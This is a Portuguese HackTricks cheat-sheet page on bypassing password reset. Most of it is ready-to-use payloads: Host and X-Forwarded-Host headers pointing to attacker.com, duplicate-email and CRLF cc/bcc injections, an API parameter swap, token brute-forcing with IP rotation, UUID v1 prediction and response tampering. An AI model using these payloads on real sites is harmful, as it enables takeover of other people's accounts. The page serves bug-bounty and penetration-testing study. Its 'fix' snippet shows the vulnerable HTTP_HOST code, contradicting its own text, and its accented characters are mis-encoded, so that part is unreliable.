# Bypass de Senha Reset/Esquecida

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Insights de Hacking**\
Engaje-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais novos bounties de bugs lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje mesmo!

A seguinte compila√ß√£o de t√©cnicas foi retirada de [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## Vazamento do Token de Reset de Senha Via Referer

O **HTTP referer** √© um campo opcional do cabe√ßalho HTTP que identifica o endere√ßo da p√°gina da web que est√° vinculada ao recurso que est√° sendo solicitado. O cabe√ßalho de requisi√ß√£o Referer cont√©m o endere√ßo da p√°gina web anterior de onde foi seguido um link para a p√°gina atualmente solicitada.

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### Explora√ß√£o

* Solicite o reset de senha para o seu endere√ßo de e-mail
* Clique no link de reset de senha
* N√£o altere a senha
* Clique em qualquer site de terceiros (ex: Facebook, Twitter)
* Intercepte a requisi√ß√£o no proxy do Burpsuite
* Verifique se o cabe√ßalho referer est√° vazando o token de reset de senha.

### Impacto

Permite que a pessoa que tem controle de um site espec√≠fico altere a senha do usu√°rio (ataque CSRF), porque essa pessoa conhece o token de reset de senha do usu√°rio.

### Refer√™ncia:

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## Envenenamento de Reset de Senha

Se voc√™ encontrar um ataque ao cabe√ßalho do host e ele estiver fora do escopo, tente encontrar o bot√£o de reset de senha!

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### Explora√ß√£o

* Intercepte a requisi√ß√£o de reset de senha no Burpsuite
* Adicione o seguinte cabe√ßalho ou edite o cabe√ßalho no Burpsuite (tente um por um)
```
Host: attacker.com
```

```
Host: target.com
X-Forwarded-Host: attacker.com
```

```
Host: target.com
Host: attacker.com
```
* Verifique se o link para alterar a senha dentro do e-mail est√° apontando para attacker.com

### Corre√ß√£o

Use `$_SERVER['SERVER_NAME']` em vez de `$_SERVER['HTTP_HOST']`
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### Impacto

A v√≠tima receber√° o link malicioso em seu e-mail e, ao clicar, ir√° vazar o link/token de redefini√ß√£o de senha do usu√°rio para o atacante, levando √† tomada total da conta.

### Refer√™ncia:

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## Redefini√ß√£o de Senha Manipulando o Par√¢metro de Email

### Explora√ß√£o

* Adicionar e-mail do atacante como segundo par√¢metro usando &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* Adicione o e-mail do atacante como segundo par√¢metro usando %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* Adicione o e-mail do atacante como segundo par√¢metro usando |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* Adicione o e-mail do atacante como segundo par√¢metro usando cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* Adicione o email do atacante como segundo par√¢metro usando bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* Adicione o e-mail do atacante como segundo par√¢metro usando ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* Adicione o e-mail do atacante como segundo par√¢metro no array json
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### Refer√™ncia

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## Alterando o Email e Senha de qualquer Usu√°rio atrav√©s de Par√¢metros da API

### Explora√ß√£o

* O atacante deve fazer login com sua conta e acessar a fun√ß√£o de Mudar senha
* Iniciar o Burp Suite e Intercept a requisi√ß√£o
* Ap√≥s interceptar a requisi√ß√£o, envi√°-la para o repetidor e modificar os par√¢metros Email e Senha
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### Refer√™ncia

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### Sem Limita√ß√£o de Taxa: Bombardeio de Email <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### Explora√ß√£o

* Inicie o Burp Suite e Intercepte a solicita√ß√£o de redefini√ß√£o de senha
* Envie para o intruso
* Use carga √∫til nula

### Refer√™ncia

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## Descubra Como o Token de Redefini√ß√£o de Senha √© Gerado

Descubra o padr√£o do token de redefini√ß√£o de senha

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

Se ele

* Gerado com base no Timestamp
* Gerado com base no UserID
* Gerado com base no email do Usu√°rio
* Gerado com base no Primeiro e √öltimo nome
* Gerado com base na Data de Nascimento
* Gerado com base em Criptografia

Use o Burp Sequencer para encontrar a aleatoriedade ou previsibilidade dos tokens.

## GUID Adivinh√°vel

Existem diferentes tipos de GUIDs:

* **Vers√£o 0:** Apenas visto no GUID nulo ("00000000-0000-0000-0000-000000000000").
* **Vers√£o 1:** O GUID √© gerado de maneira previs√≠vel com base em:
* O momento atual
* Uma "sequ√™ncia de rel√≥gio" gerada aleatoriamente que permanece constante entre os GUIDs durante o tempo de atividade do sistema gerador
* Um "ID de n√≥", que √© gerado com base no endere√ßo MAC do sistema, se dispon√≠vel
* **Vers√£o 3:** O GUID √© gerado usando um hash MD5 de um nome e namespace fornecidos.
* **Vers√£o 4:** O GUID √© gerado aleatoriamente.
* **Vers√£o 5:** O GUID √© gerado usando um hash SHA1 de um nome e namespace fornecidos.

√â poss√≠vel olhar para um GUID e descobrir sua vers√£o, existe uma pequena ferramenta para isso: [**guidtool**](https://github.com/intruder-io/guidtool)****
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
Se a vers√£o utilizada para gerar um GUID de redefini√ß√£o de senha for a vers√£o 1, √© poss√≠vel for√ßar bruta dos GUIDS:
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### Refer√™ncias

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## Manipula√ß√£o de resposta: Substituir resposta ruim por uma boa

Procure por Requisi√ß√£o e Resposta como estas
```php
HTTP/1.1 401 Unauthorized
(‚Äúmessage‚Äù:‚Äùunsuccessful‚Äù,‚ÄùstatusCode:403,‚ÄùerrorDescription‚Äù:‚ÄùUnsuccessful‚Äù)
```
Mudan√ßa de Resposta
```php
HTTP/1.1 200 OK
(‚Äúmessage‚Äù:‚Äùsuccess‚Äù,‚ÄùstatusCode:200,‚ÄùerrorDescription‚Äù:‚ÄùSuccess‚Äù)
```
### Refer√™ncia

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### Usando Token Expirado <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* Verifique se o token expirado pode ser reutilizado

### For√ßa Bruta no Token de Redefini√ß√£o de Senha <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Tente for√ßar a descoberta do token de redefini√ß√£o usando Burpsuite
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* Use o IP-Rotator no burpsuite para contornar o limite de taxa baseado em IP.

### Refer√™ncia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### Tente Usar Seu Token <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* Tente adicionar seu token de redefini√ß√£o de senha com a conta da v√≠tima
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### Refer√™ncia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## Invalida√ß√£o de Sess√£o no Logout/Reset de Senha

Quando um usu√°rio **faz logout ou redefine sua senha**, a sess√£o atual deve ser invalidada.\
Portanto, **capture os cookies** enquanto o usu√°rio est√° logado, **fa√ßa logout** e **verifique** se os **cookies** ainda est√£o **v√°lidos**.\
Repita o processo **mudando a senha** em vez de fazer logout.

## Tempo de Expira√ß√£o do Token de Reset

Os **tokens de reset devem ter um tempo de expira√ß√£o**, ap√≥s isso o token n√£o deve ser v√°lido para alterar a senha de um usu√°rio.

## Verifica√ß√µes Extras

* Use username@burp\_collab.net e analise o callback
* Usu√°rio c√≥pia de carbono email=victim@mail.com%0a%0dcc:hacker@mail.com
* Senha longa (>200) leva a DoS
* Anexe segundo par√¢metro de email e valor

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Insights de Hacking**\
Interaja com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado com os mais novos bounties de bugs lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
